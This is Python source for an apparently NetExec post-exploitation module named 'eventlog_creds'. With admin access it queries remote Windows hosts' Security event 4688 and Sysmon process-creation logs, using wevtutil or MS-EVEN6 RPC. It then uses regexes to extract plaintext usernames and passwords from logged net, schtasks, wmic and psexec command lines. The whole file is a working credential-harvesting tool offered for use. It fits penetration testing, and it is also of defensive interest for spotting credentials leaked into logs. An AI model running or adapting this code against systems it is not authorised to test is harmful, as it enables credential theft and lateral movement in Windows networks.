import re
from impacket.dcerpc.v5 import transport, even6
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.dcerpc.v5.epm import hept_map
from nxc.helpers.even6_parser import ResultSet


class NXCModule:
    """
    Module by @lodos2005
    This module extracts credentials from Windows logs. It uses Security Event ID: 4688 and SYSMON logs.
    """
    name = "eventlog_creds"
    description = "Extracting Credentials From Windows Logs (Event ID: 4688 and SYSMON)"
    supported_protocols = ["smb"]  # Example: ['smb', 'mssql']
    opsec_safe = True  # Does the module touch disk?
    multiple_hosts = True  # Does it make sense to run this module on multiple hosts at a time?

    def __init__(self):
        self.context = None
        self.module_options = None
        self.method = "execute"
        self.limit = 1000

    def options(self, context, module_options):
        """ 
        METHOD         EventLog method (Execute or RPCCALL)
        M              Alias for METHOD
        LIMIT          Limit of the number of records to be fetched
        L              Alias for LIMIT
        """
        if "METHOD" in module_options:
            self.method = module_options["METHOD"]
        if "M" in module_options:
            self.method = module_options["M"]
        if "LIMIT" in module_options:
            self.limit = int(module_options["LIMIT"])
        if "L" in module_options:
            self.limit = int(module_options["L"])

    def find_credentials(self, content, context):
        # remove unnecessary words
        content = content.replace("\r\n", "\n")
        content = content.replace("/add", "") 
        content = content.replace("/active:yes", "") 

        # sort and unique lines
        content = "\n".join(sorted(set(content.split("\n"))))

        regexps = [
            # "C:\Windows\system32\net.exe" user /add lodos2005 123456 /domain 
            "net.+user\s+(?P<username>[^\s]+)\s+(?P<password>[^\s]+)",
            # "C:\Windows\system32\net.exe" use \\server\share /user:contoso\lodos2005 password
            "net.+use.+/user:(?P<username>[^\s]+)\s+(?P<password>[^\s]+)",
            # schtasks.exe /CREATE /S 192.168.20.05 /RU SYSTEM /U lodos2005@contoso /P "123456" /SC ONCE /ST 20:05 /TN Test /TR hostname /F
            "schtasks.+/U\s+(?P<username>[^\s]+).+/P\s+(?P<password>[^\s]+)",
            # wmic.exe /node:192.168.20.05 /user:lodos2005@contoso /password:123456 computersystem get
            "wmic.+/user:\s*(?P<username>[^\s]+).+/password:\s*(?P<password>[^\s]+)",
            # psexec \\192.168.20.05 -u lodos2005@contoso -p 123456 hostname
            "psexec.+-u\s+(?P<username>[^\s]+).+-p\s+(?P<password>[^\s]+)",
            # generic username on command line
            "(?:(?:(?:-u)|(?:-user)|(?:-username)|(?:--user)|(?:--username)|(?:/u)|(?:/USER)|(?:/USERNAME))(?:\s+|\:)(?P<username>[^\s]+))",
            # generic password on command line
            "(?:(?:(?:-p)|(?:-password)|(?:-passwd)|(?:--password)|(?:--passwd)|(?:/P)|(?:/PASSWD)|(?:/PASS)|(?:/CODE)|(?:/PASSWORD))(?:\s+|\:)(?P<password>[^\s]+))",
        ]
        # Extracting credentials
        for line in content.split("\n"):
            for reg in regexps:
                # verbose context.log.debug("Line: " + line)
                # verbose context.log.debug("Reg: " + reg)
                match = re.search(reg, line, re.IGNORECASE)
                if match:
                    # eleminate false positives
                    # C:\Windows\system32\svchost.exe -k DcomLaunch -p -s PlugPlay
                    if not match.groupdict().get("username") and match.groupdict().get("password") and len(match.group("password")) < 6: 
                        # if password is found but username is not found, and password is shorter than 6 characters, ignore it
                        continue
                    if not match.groupdict().get("password") and match.groupdict().get("username"): 
                        # if username is found but password is not found. we need? ignore it 
                        continue
                    # C:\Windows\system32\RunDll32.exe C:\Windows\system32\migration\WininetPlugin.dll,MigrateCacheForUser /m /0
                    if match.groupdict().get("username") and match.groupdict().get("password") and len(match.group("password")) < 6 and len(match.group("username")) < 6: 
                        # if username and password is shorter than 6 characters, ignore it
                        continue

                    context.log.highlight("Credentials found! " + line.strip())
                    if match.groupdict().get("username"):
                        context.log.highlight("Username: " + match.group("username"))
                    if match.groupdict().get("password"):
                        context.log.highlight("Password: " + match.group("password"))
                    break

    def on_admin_login(self, context, connection):
        content = ""
        if self.method[:1].lower() == "e":
            # https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4688
            commands = [
                f'wevtutil qe Security /c:{self.limit} /f:text /rd:true /q:"*[System[(EventID=4688)]]" |findstr "Command Line"',
                f'wevtutil qe Microsoft-Windows-Sysmon/Operational /c:{self.limit} /f:text  /rd:true /q:"*[System[(EventID=1)]]" |findstr "ParentCommandLine"'
            ]
            for command in commands:
                context.log.debug("Execute Command: " + command)
                content += connection.execute(command, True)
        else:
            msevenclass = MSEven6Trigger(context)
            target = connection.host if not connection.kerberos else connection.hostname + "." + connection.domain
            msevenclass.connect(
                username=connection.username,
                password=connection.password,
                domain=connection.domain,
                lmhash=connection.lmhash,
                nthash=connection.nthash,
                target=target,
                doKerberos=connection.kerberos,
                dcHost=connection.kdcHost,
                aesKey=connection.aesKey,
                pipe="eventlog"
            )
            for record in msevenclass.query("\x00", '<QueryList><Query Id="0"><Select Path="Security">*[System/EventID=4688]</Select></Query><Query Id="0"><Select Path="Microsoft-Windows-Sysmon/Operational">*[System/EventID=1]</Select></Query></QueryList>\x00', self.limit):
                if record is None:
                    continue
                try:
                    xmlString = ResultSet(record).xml()
                    regexp = 'CommandLine">(?P<CommandLine>(.|\n)*?)<\/Data>'
                    match = re.search(regexp, xmlString, re.IGNORECASE)
                    if match and match.groupdict().get("CommandLine"):
                        content += "CommandLine: " + match.group("CommandLine") + "\n"
                except Exception as e:
                    context.log.error(f"Error: {e}")
                    continue

        self.find_credentials(content, context)

class MSEven6Trigger:
    def __init__(self, context):
        self.context = context
        self.dce = None

    def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe):
        rpctransport = transport.DCERPCTransportFactory(hept_map(target, even6.MSRPC_UUID_EVEN6, protocol="ncacn_ip_tcp"))
        if hasattr(rpctransport, "set_credentials"):
            rpctransport.set_credentials(
                username=username,
                password=password,
                domain=domain,
                lmhash=lmhash,
                nthash=nthash,
                aesKey=aesKey,
            )
        if doKerberos:
            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
        rpctransport.setRemoteHost(target)
        self.dce = rpctransport.get_dce_rpc()
        if doKerberos:
            self.dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        self.dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        self.context.log.debug(f"Connecting to {target}...")
        try:
            self.dce.connect()
        except Exception as e:
            self.context.log.debug(f"Something went wrong, check error status => {e!s}")
            return
        try:
            self.dce.bind(even6.MSRPC_UUID_EVEN6)
            self.context.log.debug("[+] Successfully bound!")
        except Exception as e:
            self.context.log.debug(f"Something went wrong, check error status => {e!s}")
            return
        self.context.log.debug("[+] Successfully bound!")

    def query(self, path, query, limit):
        req = even6.EvtRpcRegisterLogQuery()
        req["Path"] = path + "\x00"
        req["Query"] = query + "\x00"
        req["Flags"] = even6.EvtQueryChannelName | even6.EvtReadNewestToOldest

        resp = self.dce.request(req)
        handle = resp["Handle"]

        return MSEven6Result(self, handle, limit)
    
class MSEven6Result:
    def __init__(self, conn, handle, limit):
        self._conn = conn
        self._handle = handle
        self._hardlimit = limit

    def __iter__(self):
        self._resp = None
        return self

    def __next__(self):
        self._hardlimit -= 1
        if self._hardlimit < 0:
            raise StopIteration
        if self._resp is not None and self._resp["NumActualRecords"] == 0:
            return None

        if self._resp is None or self._index == self._resp["NumActualRecords"]:
            req = even6.EvtRpcQueryNext()
            req["LogQuery"] = self._handle
            req["NumRequestedRecords"] = 100
            req["TimeOutEnd"] = 1000
            req["Flags"] = 0
            self._resp = self._conn.dce.request(req)

            if self._resp["NumActualRecords"] == 0:
                return None
            else:
                self._index = 0

        offset = self._resp["EventDataIndices"][self._index]["Data"]
        size = self._resp["EventDataSizes"][self._index]["Data"]
        self._index += 1

        return b"".join(self._resp["ResultBuffer"][offset:offset + size])
